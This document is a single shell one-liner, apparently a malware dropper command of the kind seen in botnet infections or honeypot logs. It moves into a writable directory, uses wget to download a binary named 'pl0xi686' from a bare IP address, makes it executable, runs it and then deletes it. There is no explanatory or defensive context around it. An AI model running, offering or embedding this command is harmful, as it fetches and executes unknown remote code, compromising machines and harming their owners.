cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.88.3.36/pl0xi686; chmod +x pl0xi686; ./pl0xi686; rm -rf pl0xi686
